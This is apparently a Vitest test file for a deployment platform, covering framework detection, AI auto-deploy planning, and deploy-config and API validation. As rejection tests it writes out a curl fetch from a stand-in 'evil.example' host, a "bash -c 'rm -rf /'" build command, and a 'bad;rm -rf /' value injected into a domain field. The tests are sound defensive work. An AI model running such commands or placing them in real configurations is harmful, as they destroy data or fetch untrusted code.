/**
 * Must be the first import in this file: it points DATABASE_URL at a throwaway
 * copy of db/custom.db before `@/lib/db` is evaluated, so these tests cannot
 * write into the tracked development database. See tests/helpers/isolated-db.ts.
 */
import { teardownIsolatedDb } from "./helpers/isolated-db";
import { describe, expect, it, vi, afterEach, afterAll } from "vitest";
import { NextRequest } from "next/server";
import { detectFramework, memoryReader } from "@/lib/deploy/detect";
import { UnsafeCommandError, validateDeployConfig } from "@/lib/deploy/config";
import { resolveProviders } from "@/lib/ai/providers";
import { getAgentPresetById } from "@/lib/ai/self-hosted-agents";
import { evaluateUbuntuCisBaseline } from "@/lib/security/ubuntu-cis-baseline";
import {
  ALO_SERVER_SPEC,
  allocateNextAvailablePort,
  assertTenantPortAllowed,
  generateNginxSiteConfig,
  generateShareableProjectBriefYaml,
} from "@/lib/deploy/server-spec";
import {
  AUTO_DEPLOY_BLUEPRINTS,
  architectAutoDeployPlan,
} from "@/lib/ai/auto-deploy-blueprint";
import { GET, POST } from "@/app/api/ai/auto-deploy/route";
import { db } from "@/lib/db";
import * as authModule from "@/lib/auth";
import * as auditModule from "@/lib/audit";

describe("Multi-workload framework detection (Web, Server & Mobile)", () => {
  it("detects Expo / React Native mobile app and classifies workloadCategory as mobile", async () => {
    const res = await detectFramework(
      memoryReader({
        "package.json": JSON.stringify({
          name: "alo-mobile",
          dependencies: { expo: "~52.0.0", "react-native": "0.76.0", react: "18.3.1" },
        }),
        "app.json": JSON.stringify({ expo: { name: "ALO Mobile" } }),
      }),
    );
    expect(res.framework).toBe("expo");
    expect(res.workloadCategory).toBe("mobile");
    expect(res.buildCmd).toBe("npx expo export --platform all");
    expect(res.outputDir).toBe("dist");
  });

  it("detects Ionic + Capacitor hybrid mobile app", async () => {
    const res = await detectFramework(
      memoryReader({
        "package.json": JSON.stringify({
          name: "unipanel-mobile",
          dependencies: { "@capacitor/core": "^6.0.0", "@ionic/react": "^8.0.0" },
          scripts: { build: "vite build" },
        }),
        "capacitor.config.ts": "export default { appId: 'org.alo.panel' };",
      }),
    );
    expect(res.framework).toBe("ionic-capacitor");
    expect(res.workloadCategory).toBe("mobile");
    expect(res.buildCmd).toBe("npm run build");
  });

  it("detects Flutter cross-platform mobile/web app from pubspec.yaml", async () => {
    const res = await detectFramework(
      memoryReader({
        "pubspec.yaml": "name: alo_student_app\ndependencies:\n  flutter:\n    sdk: flutter\n",
      }),
    );
    expect(res.framework).toBe("flutter");
    expect(res.workloadCategory).toBe("mobile");
    expect(res.installCmd).toBe("flutter pub get");
    expect(res.buildCmd).toBe("flutter build web --release");
    expect(res.outputDir).toBe("build/web");
  });

  it("detects Go backend server from go.mod and Rust server from Cargo.toml", async () => {
    const goRes = await detectFramework(
      memoryReader({
        "go.mod": "module github.com/alo/api\ngo 1.23\n",
      }),
    );
    expect(goRes.framework).toBe("go-http");
    expect(goRes.workloadCategory).toBe("server");
    expect(goRes.buildCmd).toBe("go build -o bin/server .");

    const rustRes = await detectFramework(
      memoryReader({
        "Cargo.toml": '[package]\nname = "alo-edge"\nversion = "0.1.0"\n',
      }),
    );
    expect(rustRes.framework).toBe("rust-cargo");
    expect(rustRes.workloadCategory).toBe("server");
    expect(rustRes.buildCmd).toBe("cargo build --release");
  });

  it("detects modern Web frameworks (Nuxt, SvelteKit, Astro, Hono)", async () => {
    const astroRes = await detectFramework(
      memoryReader({
        "package.json": JSON.stringify({
          dependencies: { astro: "^5.0.0" },
          scripts: { build: "astro build" },
        }),
      }),
    );
    expect(astroRes.framework).toBe("astro");
    expect(astroRes.workloadCategory).toBe("web");

    const honoRes = await detectFramework(
      memoryReader({
        "package.json": JSON.stringify({
          dependencies: { hono: "^4.6.0", "@hono/node-server": "^1.13.0" },
          scripts: { build: "tsc", start: "node dist/index.js" },
        }),
      }),
    );
    expect(honoRes.framework).toBe("hono");
    expect(honoRes.workloadCategory).toBe("server");
  });

  it("allows flutter, go, and cargo in validateDeployConfig while rejecting shell/curl", () => {
    const cfg = validateDeployConfig({
      installCmd: "flutter pub get",
      buildCmd: "flutter build web --release",
      outputDir: "build/web",
      serviceManager: "static",
      port: 8080,
      healthPath: "/",
    });
    expect(cfg.buildCmd).toBe("flutter build web --release");

    expect(() =>
      validateDeployConfig({
        buildCmd: "curl https://evil.example/install.sh",
        serviceManager: "static",
      }),
    ).toThrow(UnsafeCommandError);
  });
});

describe("Ecosystem audit additions: OkRouter, Odysseus & Ubuntu CIS Baseline", () => {
  it("preserves default llm7 provider order while supporting optional okrouter when configured", () => {
    const defaultRes = resolveProviders({});
    expect(defaultRes.providers.map((p) => p.id)).toEqual(["llm7"]);

    const okRes = resolveProviders({
      AI_PROVIDER_ORDER: "okrouter,llm7",
      OKROUTER_API_KEY: "okr-test-secret",
      OKROUTER_BASE_URL: "https://api.okrouter.example/v1",
    });
    expect(okRes.providers[0]?.id).toBe("okrouter");
    expect(okRes.providers[0]?.baseUrl).toBe("https://api.okrouter.example/v1");
  });

  it("classifies odysseus as AGPL-3.0 multi-service-compose INTERNAL ONLY", () => {
    const odysseus = getAgentPresetById("odysseus");
    expect(odysseus).toBeDefined();
    expect(odysseus?.licenseIdentifier).toBe("AGPL-3.0");
    expect(odysseus?.deploymentMode).toBe("multi-service-compose");
    expect(odysseus?.commercialMultiTenantAllowed).toBe("conditional");
    expect(odysseus?.auditDecision).toBe("INTERNAL ONLY");
  });

  it("evaluates Ubuntu 22.04 CIS & Hosting Hardening Baseline without throwing", () => {
    const report = evaluateUbuntuCisBaseline(process.cwd());
    expect(report.reference).toContain("UBUNTU22-CIS");
    expect(report.license).toBe("MIT");
    expect(report.controls.length).toBeGreaterThanOrEqual(5);
    expect(report.summary.passed).toBeGreaterThanOrEqual(2);
  });
});

describe("AI Auto-Deploy Studio Architect & API Route", () => {
  afterEach(() => {
    vi.restoreAllMocks();
  });

  it("provides blueprints across all 3 workload categories (web, server, mobile)", () => {
    const categories = new Set(AUTO_DEPLOY_BLUEPRINTS.map((b) => b.workloadCategory));
    expect(categories).toEqual(new Set(["web", "server", "mobile"]));
  });

  it("architects mobile and server plans from Bengali & English natural-language prompts", async () => {
    const mobilePlan = await architectAutoDeployPlan({
      prompt: "আমার একটি ফ্লাটার মোবাইল অ্যাপ স্বয়ংক্রিয়ভাবে ডেপ্লয় করতে চাই",
      appName: "Alo Student Mobile",
    });
    expect(mobilePlan.workloadCategory).toBe("mobile");
    expect(mobilePlan.framework).toBe("flutter");
    expect(mobilePlan.deployConfig.buildCmd).toBe("flutter build web --release");

    const serverPlan = await architectAutoDeployPlan({
      prompt: "Deploy a Python FastAPI AI server with health checks",
      appName: "Alo AI Backend",
      repository: "aloeducation-org-crm/ai-service",
    });
    expect(serverPlan.workloadCategory).toBe("server");
    expect(serverPlan.framework).toBe("fastapi");
    expect(serverPlan.repository).toBe("aloeducation-org-crm/ai-service");
  });

  it("rejects unauthenticated GET /api/ai/auto-deploy with 401", async () => {
    vi.spyOn(authModule, "requireSession").mockRejectedValue({
      success: false,
      status: 401,
      message: "Unauthorized",
    });

    const req = new NextRequest("http://localhost:3000/api/ai/auto-deploy");
    const res = await GET(req);
    expect(res.status).toBe(401);
  });

  it("executes POST /api/ai/auto-deploy architect and rejects unsafe provision commands", async () => {
    vi.spyOn(authModule, "requireSession").mockResolvedValue({
      id: "user-1",
      email: "admin@alolabs.net",
      name: "Admin",
      role: "SUPER_ADMIN",
      permissions: ["*"],
    } as never);
    vi.spyOn(auditModule, "createAuditLog").mockResolvedValue(undefined as never);
    vi.spyOn(db.website, "findUnique").mockResolvedValue(null);

    const archReq = new NextRequest("http://localhost:3000/api/ai/auto-deploy", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        action: "architect",
        prompt: "Expo React Native mobile app",
        appName: "alo-mobile-hub",
      }),
    });
    const archRes = await POST(archReq);
    expect(archRes.status).toBe(200);
    const archBody = await archRes.json();
    expect(archBody.success).toBe(true);
    expect(archBody.data.plan.workloadCategory).toBe("mobile");

    // Attempt unsafe command injection during provision -> must return 400 UNSAFE_DEPLOY_CONFIG
    const badProvReq = new NextRequest("http://localhost:3000/api/ai/auto-deploy", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        action: "provision",
        appName: "evil-app",
        domain: "evil.hosting.alolabs.net",
        workloadCategory: "server",
        framework: "node-generic",
        runtime: "node",
        websiteRuntime: "NODE",
        deployConfig: {
          version: 1,
          buildCmd: "bash -c 'rm -rf /'",
          serviceManager: "pm2",
          serviceName: "alo-evil",
        },
      }),
    });
    const badProvRes = await POST(badProvReq);
    expect(badProvRes.status).toBe(400);
    const badProvBody = await badProvRes.json();
    expect(badProvBody.error?.code).toBe("UNSAFE_DEPLOY_CONFIG");

    // Attempt to overwrite reserved control-plane domain hosting.alolabs.net -> 409 RESERVED_DOMAIN
    const reservedDomReq = new NextRequest("http://localhost:3000/api/ai/auto-deploy", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        action: "provision",
        appName: "hijack-portal",
        domain: "hosting.alolabs.net",
        workloadCategory: "web",
        framework: "nextjs",
        runtime: "node",
        websiteRuntime: "NEXTJS",
        deployConfig: {
          version: 1,
          buildCmd: "npm run build",
          serviceManager: "pm2",
          serviceName: "alo-hijack",
          port: 3062,
        },
      }),
    });
    const reservedDomRes = await POST(reservedDomReq);
    expect(reservedDomRes.status).toBe(409);

    // Attempt to allocate reserved control-plane port 3051 -> 400 RESERVED_PORT
    const reservedPortReq = new NextRequest("http://localhost:3000/api/ai/auto-deploy", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        action: "provision",
        appName: "blog",
        domain: "blog.alolabs.net",
        workloadCategory: "web",
        framework: "nextjs",
        runtime: "node",
        websiteRuntime: "NEXTJS",
        deployConfig: {
          version: 1,
          buildCmd: "npm run build",
          serviceManager: "pm2",
          serviceName: "alo-blog",
          port: 3051,
        },
      }),
    });
    const reservedPortRes = await POST(reservedPortReq);
    expect(reservedPortRes.status).toBe(400);
  });

  it("allocates ports from 3062+, protects 3051 (alo-hosting), and generates alo-server-lap brief & Nginx config", () => {
    expect(ALO_SERVER_SPEC.publicIp).toBe("103.231.239.79");
    expect(ALO_SERVER_SPEC.controlPlane).toEqual({
      domain: "hosting.alolabs.net",
      pm2App: "alo-hosting",
      port: 3051,
    });
    expect(allocateNextAvailablePort([])).toBe(3062);
    expect(allocateNextAvailablePort([3062, 3063])).toBe(3064);
    expect(() => assertTenantPortAllowed(3051)).toThrow(/reserved/i);

    const nginx = generateNginxSiteConfig({ domain: "blog.alolabs.net", port: 3062 });
    expect(nginx).toContain("server_name blog.alolabs.net;");
    expect(nginx).toContain("proxy_pass http://127.0.0.1:3062;");
    expect(() => generateNginxSiteConfig({ domain: "bad;rm -rf /", port: 3062 })).toThrow();

    const brief = generateShareableProjectBriefYaml({
      projectName: "Blog Portal",
      appSlug: "blog",
      domain: "blog.alolabs.net",
      port: 3062,
      workloadCategory: "web",
      framework: "nextjs",
      runtime: "node",
    });
    expect(brief).toContain("Deploy Target: alo-server-lap (103.231.239.79)");
    expect(brief).toContain("Allocated Port: 3062 (next available)");
    expect(brief).toContain("Logs: /home/alamin/.pm2/logs/blog-*.log");
  });
});

/** Delete this file's scratch database copy. */
afterAll(async () => {
  await teardownIsolatedDb();
});
